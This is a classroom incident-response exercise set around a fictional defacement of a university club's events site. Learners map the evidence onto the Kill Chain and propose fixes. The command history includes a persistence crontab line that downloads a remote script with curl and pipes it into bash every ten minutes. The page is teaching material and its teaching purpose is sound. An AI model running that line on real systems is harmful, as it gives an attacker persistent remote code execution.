---
id: m10-08
baslik: "Practice: Trace the Attack"
hedefler:
  - Find the security gaps an attacker exploited in a fictional incident
  - Discuss how the incident could have been prevented using the Kill Chain
---

# Practice: Trace the Attack

> **Incident:** One morning the events site of the fictional North Island University Cyber Security Club
> opened with the word "HACKED". The evidence the team collected is below. All of it is **fictional**.

::cizgi[m10-08-sahne]

## Evidence

**E1 — Club server settings:** SSH port 22 open to the internet · password sign-in enabled ·
the `deploy` account's password is `Kulup2024` (unchanged for 3 years, and the same on another of the club's sites).

**E2 — `auth.log` summary (M07):** 58 failed attempts from 203.0.113.66 in about 3 minutes, followed by a successful **password** sign-in for `deploy`.

**E3 — Command history (`deploy`):**
```text
cd /var/www/etkinlik
cp index.html index.html.bak
echo "<h1>HACKED</h1>" > index.html
(crontab -l; echo "*/10 * * * * curl -s http://203.0.113.66/x.sh | bash") | crontab -
```

**E4 — Monitoring:** There is no alert rule for failed sign-ins on the server; the logs are read by hand once a week.

## Missions

![A table where small mistakes are lined up like dominoes; the first has fallen and the last is about to hit a server rack](../../gorseller/m10-08-b.webp)

1. **The chain:** Place the incident into the Kill Chain stages. Which piece of evidence shows which stage?
2. **Gaps:** List **at least 5** security gaps the attacker exploited.
3. **Breaking points:** For each gap, write **one measure** that would break the chain at that point.
4. **Persistence:** What is the last line in E3 doing? Why is it dangerous? What should be done during clean-up?
5. **Priority:** From among the measures, choose and order "the first 3 jobs for tomorrow morning".

<details><summary>Discussion notes</summary>
Gaps: SSH open to the internet · password sign-in enabled · a weak and reused password · no rate limiting/fail2ban · the deploy account's permission to write to web files (least privilege?) · no monitoring/alerts · no egress traffic restriction.
Persistence: every 10 minutes it downloads and runs a script from the attacker's server (command and control). Clean-up: clear the crontab, change the deploy password and move to key-based sign-in, close all sessions, check whether there are other changes on the server (a clean install if possible), block 203.0.113.66.
The first 3 jobs (example): 1) Cut off access and clean up the persistence 2) Turn off password sign-in on SSH + change the password 3) A failed sign-in alert and rate limiting.
</details>

## ✅ Remember

- Incidents are usually not one big mistake but a chain of small gaps.
- A "fix" made without cleaning up the persistence stays half done.
- A good incident analysis ends with prioritised recommendations.
